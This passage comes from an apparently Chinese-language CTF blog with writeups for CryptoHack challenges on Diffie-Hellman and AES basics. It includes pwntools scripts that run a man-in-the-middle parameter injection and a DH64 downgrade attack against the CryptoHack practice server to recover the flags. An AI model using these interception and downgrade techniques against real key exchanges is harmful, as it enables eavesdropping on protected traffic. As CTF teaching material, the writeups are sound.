50297407027926009182761627800181901721840557870828019840218548188487260441829333603432714023447029942863076979487889569452186257333512355724725941390498966546682790608125613166744820307691068563387354936732643569654017172shared_secret = pow(A,b,p)print(shared_secret)# 1174130740413820656533832746034841985877302086316388380165984436672307692443711310285014138545204369495478725102882673427892104539120952393788961051992901649694063179853598311473820341215879965343136351436410522850717408445802043003164658348006577408558693502220285700893404674592567626297571222027902631157072143330043118418467094237965591198440803970726604537807146703763571606861448354607502654664700390453794493176794678917352634029713320615865940720837909466 Deriving Symmetric Keys题 1234567891011121314151617181920212223242526from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadimport hashlibimport osfrom secret import shared_secretFLAG = b&#x27;crypto&#123;????????????????????????????&#125;&#x27;def encrypt_flag(shared_secret: int): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#x27;ascii&#x27;)) key = sha1.digest()[:16] # Encrypt flag iv = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv) ciphertext = cipher.encrypt(pad(FLAG, 16)) # Prepare data to send data = &#123;&#125; data[&#x27;iv&#x27;] = iv.hex() data[&#x27;encrypted_flag&#x27;] = ciphertext.hex() return dataprint(encrypt_flag(shared_secret)) 1234567891011121314151617181920212223242526272829303132from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadimport hashlibdef is_pkcs7_padded(message): padding = message[-message[-1]:] return all(padding[i] == len(padding) for i in range(0, len(padding)))def decrypt_flag(shared_secret: int, iv: str, ciphertext: str): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#x27;ascii&#x27;)) key = sha1.digest()[:16] # Decrypt flag ciphertext = bytes.fromhex(ciphertext) iv = bytes.fromhex(iv) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) if is_pkcs7_padded(plaintext): return unpad(plaintext, 16).decode(&#x27;ascii&#x27;) else: return plaintext.decode(&#x27;ascii&#x27;)shared_secret = ?iv = ?ciphertext = ?print(decrypt_flag(shared_secret, iv, ciphertext)) 解1234567891011121314151617181920212223242526272829303132333435363738394041from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadimport hashlibdef is_pkcs7_padded(message): padding = message[-message[-1]:] return all(padding[i] == len(padding) for i in range(0, len(padding)))def decrypt_flag(shared_secret: int, iv: str, ciphertext: str): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#x27;ascii&#x27;)) key = sha1.digest()[:16] # Decrypt flag ciphertext = bytes.fromhex(ciphertext) iv = bytes.fromhex(iv) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) if is_pkcs7_padded(plaintext): return unpad(plaintext, 16).decode(&#x27;ascii&#x27;) else: return plaintext.decode(&#x27;ascii&#x27;)g=2p=2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919A=112218739139542908880564359534373424013016249772931962692237907571990334483528877513809272625610512061159061737608547288558662879685086684299624481742865016924065000555267977830144740364467977206555914781236397216033805882207640219686011643468275165718132888489024688846101943642459655423609111976363316080620471928236879737944217503462265615774774318986375878440978819238346077908864116156831874695817477772477121232820827728424890845769152726027520772901423784b=197395083814907028991785772714920885908249341925650951555219049411298436217190605190824934787336279228785809783531814507661385111220639329358048196339626065676869119737979175531770768861808581110311903548567424039264485661330995221907803300824165469977099494284722831845653985392791480264712091293580274947132480402319812110462641143884577706335859190668240694680261160210609506891842793868297672619625924001403035676872189455767944077542198064499486164431451944B=1241972460522075344783337556660700537760331108332735677863862813666578639518899293226399921252049655031563612905395145236854443334774555982204857895716383215705498970395379526698761468932147200650513626028263449605755661189525521343142979265044068409405667549241125597387173006460145379759986272191990675988873894208956851773331039747840312455221354589910726982819203421992729738296452820365553759182547255998984882158393688119629609067647494762616719047466973581shared_secret = pow(A,b,p)iv = &quot;737561146ff8194f45290f5766ed6aba&quot;ciphertext = &quot;39c99bf2f0c14678d6a5416faef954b5893c316fc3c48622ba1fd6a9fe85f3dc72a29c394cf4bc8aff6a7b21cae8e12c&quot;print(decrypt_flag(shared_secret, iv, ciphertext))# crypto&#123;sh4r1ng_s3cret5_w1th_fr13nd5&#125; Parameter Injection题 解我们会先收到Alice发送的公钥以及参数（p,g,A），可以选择不进行修改将其发送给Bob。而后收到了Bob的公钥B之后我们将其修改为g发送给Alice。这时对A来说，他们的共享密钥为： B^a = g^a = A，是我们已知的，所以最后用其解密收到AES加密后的信息即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *import jsonfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadimport hashlibdef is_pkcs7_padded(message): padding = message[-message[-1]:] return all(p == len(padding) for p in padding)def decrypt_flag(shared_secret: int, iv: str, ciphertext: str): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#x27;ascii&#x27;)) key = sha1.digest()[:16] # Decrypt flag ciphertext = bytes.fromhex(ciphertext) iv = bytes.fromhex(iv) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) if is_pkcs7_padded(plaintext): return unpad(plaintext, 16).decode(&#x27;ascii&#x27;) else: return plaintext.decode(&#x27;ascii&#x27;)r = remote(&quot;socket.cryptohack.org&quot;, 13371)alice_raw = r.recvline().decode()# print(alice_raw)# Intercepted from Alice: &#123;&quot;p&quot;: &quot;0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca237327ffffffffffffffff&quot;, &quot;g&quot;: &quot;0x02&quot;, &quot;A&quot;: &quot;0x66dfba3758f569f2e8555b078f0ab97cebee5d95e0952156442dad855a6fa4b83f46706864009e5f4a675ac9805a62c98bfdb11257c093f709e665dedce2b5e2d1fac06abc6f20ee542359062a0cbfef4c34e82d1ca6ed7e005d42d1b1101bf17ee19e1dba12cfbb7cd13b2754c224a0e1200f1c28780ee117b8779be01af187a69bbba2bf7429370775cf34611ff93e90b3851d927ae7c41e4a83866ed5df76edb3c9f36fa5fb955887ccec964a773240d7b24df13f5cc0d9ffcc7fc3c9d19d&quot;&#125;alice_data = json.loads(alice_raw.split(&quot;Intercepted from Alice: &quot;)[1])r.sendafter(b&quot;Send to Bob:&quot;, json.dumps(alice_data).encode())# 拦截 Bob 的数据并修改 B=gbob_raw = r.recvline().decode()# print(bob_raw)# Intercepted from Bob: &#123;&quot;B&quot;: &quot;0x4b3506e067f1e4c2cb9a481efe7df6300cc39cfa71e93468afd35d7bdccc95d479f6711672ec1c1c2ca2bc7e69ebc66e548323efebcccb6b6f1cf5e313aecf2b8e31a382481a867fd1f37623ba69224f5d51788df06f4f579f0cc4bc301977ec442332dc370a5e30e701dce36df6cc16b4a9f4f85a39a1ac98431fc3af5726f506f22b7947f2c555af0d2d3135b74ba9d19851c0aac1ab6bc672878edb26a4838593a023ede0074e4e013a33f373406751563cdf6a1a8015345b47d2f4ee67ca&quot;&#125;bob_data = json.loads(bob_raw.split(&quot;Intercepted from Bob: &quot;)[1])bob_data[&#x27;B&#x27;] = alice_data[&#x27;g&#x27;]r.sendafter(b&quot;Send to Alice:&quot;, json.dumps(bob_data).encode())# 接收加密数据final_response = r.recvall()# print(final_response)# b&#x27; Intercepted from Alice: &#123;&quot;iv&quot;: &quot;43650888bb6facc1200aa3ddbf103cb4&quot;, &quot;encrypted_flag&quot;: &quot;4d9ec31387929a23395dd382d0b5fc62b377a4daa95f168d17cdd4c2630a5b69&quot;&#125;\\n&#x27;final_data = json.loads(final_response.decode().split(&quot;Intercepted from Alice: &quot;)[1])iv = final_data[&#x27;iv&#x27;]ciphertext = final_data[&#x27;encrypted_flag&#x27;]shared_secret = int(alice_data[&#x27;A&#x27;], 16)print(decrypt_flag(shared_secret, iv, ciphertext))# crypto&#123;n1c3_0n3_m4ll0ry!!!!!!!!&#125; Export-grade题 与服务器进行交互大概会收到这些内容： 123456789Intercepted from Alice: &#123;&quot;supported&quot;: [&quot;DH1536&quot;, &quot;DH1024&quot;, &quot;DH512&quot;, &quot;DH256&quot;, &quot;DH128&quot;, &quot;DH64&quot;]&#125;Send to Bob:Send to Bob: Intercepted from Bob: &#123;&quot;chosen&quot;: &quot;DH1024&quot;&#125;Send to Alice:Intercepted from Alice: &#123;&quot;p&quot;: &quot;0xde26ab651b92a129&quot;, &quot;g&quot;: &quot;0x2&quot;, &quot;A&quot;: &quot;0xab480cafdb6037a9&quot;&#125;Intercepted from Bob: &#123;&quot;B&quot;: &quot;0x2edc404ff934cbbb&quot;&#125;Intercepted from Alice: &#123;&quot;iv&quot;: &quot;de3c285b773c7f37920800f8292b5604&quot;, &quot;encrypted_flag&quot;: &quot;dfd4221ad3ec8788d6410213adae297b5076179df27885ea0fa9d76ea0748a32&quot;&#125; 解我们需要做的就是拦截选择算法的那一步，让他们选择DH64，这样就可以直接用sympy库的discrete_log计算出密钥。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *import jsonimport refrom hashlib import sha1from Crypto.Cipher import AESfrom sympy import discrete_log# 将消息中的JSON部分提取出来def recv_until_jsons(raw_data: str): json_objects = re.findall(r&#x27;\\&#123;.*?\\&#125;&#x27;, raw_data) parsed = [] for js in json_objects: try: parsed.append(json.loads(js)) except json.JSONDecodeError: continue return parsedr = remote(&quot;socket.cryptohack.org&quot;, 13379)line = r.recvline().decode().strip()json_str = re.search(r&#x27;\\&#123;.*\\&#125;&#x27;, line).group()msg = json.loads(json_str)msg[&#x27;supported&#x27;] = [&quot;DH64&quot;]r.sendline(json.dumps(msg).encode())line = r.recvline().decode().strip()json_str = re.search(r&#x27;\\&#123;.*\\&#125;&#x27;, line).group()r.sendline(json_str.encode())data = r.recvall().decode()params = &#123;&#125;for obj in recv_until_jsons(data): if &#x27;p&#x27; in obj and &#x27;g&#x27; in obj and &#x27;A&#x27; in obj: params[&#x27;p&#x27;] = int(obj[&#x27;p&#x27;], 16) params[&#x27;g&#x27;] = int(obj[&#x27;g&#x27;], 16) params[&#x27;A&#x27;] = int(obj[&#x27;A&#x27;], 16) elif &#x27;B&#x27; in obj: params[&#x27;B&#x27;] = int(obj[&#x27;B&#x27;], 16) elif &#x27;iv&#x27; in obj and &#x27;encrypted_flag&#x27; in obj: params[&#x27;iv&#x27;] = bytes.fromhex(obj[&#x27;iv&#x27;]) params[&#x27;ct&#x27;] = bytes.fromhex(obj[&#x27;encrypted_flag&#x27;])# === 计算私钥 a, 共享密钥 s, 派生 AES 密钥并解密 ===p, g, A, B = params[&#x27;p&#x27;], params[&#x27;g&#x27;], params[&#x27;A&#x27;], params[&#x27;B&#x27;]iv, ct = params[&#x27;iv&#x27;], params[&#x27;ct&#x27;]a = discrete_log(p, A, g)s = pow(B, a, p)key = sha1(str(s).encode()).digest()[:16]pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)print(pt.decode())# crypto&#123;d0wn6r4d35_4r3_d4n63r0u5&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"}]},{"title":"Cyptohack Symmetric_Cryptography Writeup","slug":"CTF/Crypto/Cyptohack-Symmetric-Cryptography-Writeup","date":"2025-06-02T20:37:53.000Z","updated":"2025-06-02T22:26:06.396Z","comments":true,"path":"2025/06/02/CTF/Crypto/Cyptohack-Symmetric-Cryptography-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/02/CTF/Crypto/Cyptohack-Symmetric-Cryptography-Writeup/","excerpt":"","text":"Keyed Permutations题 解这种叫Bijection。 1crypto&#123;bijection&#125; Resisting Bruteforce题 解根据图片中的描述，题目询问的是：“What is the name for the best single-key attack against AES?” 在描述中提到了： AES 的安全性 一个攻击能将 AES-128 的安全性降低到约 126.1 bits 这种攻击自 8 年前提出后未见改进 最后提到了量子计算机的 Grover 算法，但题目关注的是单密钥攻击 结合这些信息，这里的关键是 AES 最知名的单密钥攻击：“biclique attack”。 biclique 攻击是目前对 AES 最好的单密钥攻击，虽然它只降低了安全级别很小一部分，并且不构成现实威胁，但在学术界中，它是对 AES 的已知最佳攻击。 1crypto&#123;biclique&#125; Structure of AES题 12345678910111213141516def bytes2matrix(text): &quot;&quot;&quot; Converts a 16-byte array into a 4x4 matrix. &quot;&quot;&quot; return [list(text[i:i+4]) for i in range(0, len(text), 4)]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; ????matrix = [ [99, 114, 121, 112], [116, 111, 123, 105], [110, 109, 97, 116], [114, 105, 120, 125],]print(matrix2bytes(matrix)) 解1234567891011121314151617def bytes2matrix(text): &quot;&quot;&quot; Converts a 16-byte array into a 4x4 matrix. &quot;&quot;&quot; return [list(text[i:i+4]) for i in range(0, len(text), 4)]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; return bytes(sum(matrix, []))matrix = [ [99, 114, 121, 112], [116, 111, 123, 105], [110, 109, 97, 116], [114, 105, 120, 125],]print(matrix2bytes(matrix))# b&#x27;crypto&#123;inmatrix&#125;&#x27; Round Keys题 1234567891011121314151617181920state = [ [206, 243, 61, 34], [171, 11, 93, 31], [16, 200, 91, 108], [150, 3, 194, 51],]round_key = [ [173, 129, 68, 82], [223, 100, 38, 109], [32, 189, 53, 8], [253, 48, 187, 78],]def add_round_key(s, k): ???print(add_round_key(state, round_key)) 解123456789101112131415161718192021222324state = [ [206, 243, 61, 34], [171, 11, 93, 31], [16, 200, 91, 108], [150, 3, 194, 51],]round_key = [ [173, 129, 68, 82], [223, 100, 38, 109], [32, 189, 53, 8], [253, 48, 187, 78],]def add_round_key(s, k): return [[s[i][j] ^ k[i][j] for j in range(4)] for i in range(4)]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; return bytes(sum(matrix, []))print(matrix2bytes(add_round_key(state, round_key)))# b&#x27;crypto&#123;r0undk3y&#125;&#x27; Confusion through Substitution题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051s_box = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,)inv_s_box = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,)state = [ [251, 64, 182, 81], [146, 168, 33, 80], [199, 159, 195, 24], [64, 80, 182, 255],]def sub_bytes(s, sbox=s_box): ???print(sub_bytes(state, sbox=inv_s_box)) 解12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455s_box = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,)inv_s_box = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,)state = [ [251, 64, 182, 81], [146, 168, 33, 80], [199, 159, 195, 24], [64, 80, 182, 255],]def sub_bytes(s, sbox=s_box): return [[sbox[byte] for byte in row] for row in s]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; return bytes(sum(matrix, []))print(matrix2bytes(sub_bytes(state, sbox=inv_s_box)))# b&#x27;crypto&#123;l1n34rly&#125;&#x27; Diffusion through Permutation题 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950def shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]def inv_shift_rows(s): ???# learned from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.cxtime = lambda a: (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)def mix_single_column(a): # see Sec 4.1.2 in The Design of Rijndael t = a[0] ^ a[1] ^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xtime(a[0] ^ a[1]) a[1] ^= t ^ xtime(a[1] ^ a[2]) a[2] ^= t ^ xtime(a[2] ^ a[3]) a[3] ^= t ^ xtime(a[3] ^ u)def mix_columns(s): for i in range(4): mix_single_column(s[i])def inv_mix_columns(s): # see Sec 4.1.3 in The Design of Rijndael for i in range(4): u = xtime(xtime(s[i][0] ^ s[i][2])) v = xtime(xtime(s[i][1] ^ s[i][3])) s[i][0] ^= u s[i][1] ^= v s[i][2] ^= u s[i][3] ^= v mix_columns(s)state = [ [108, 106, 71, 86], [96, 62, 38, 72], [42, 184, 92, 209], [94, 79, 8, 54],] 解注意，这里的inv_mix_columns()和inv_shift_rows()都是没有输出的，所以只能直接调用。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859def shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]def inv_shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]# learned from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.cxtime = lambda a: (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)def mix_single_column(a): # see Sec 4.1.2 in The Design of Rijndael t = a[0] ^ a[1] 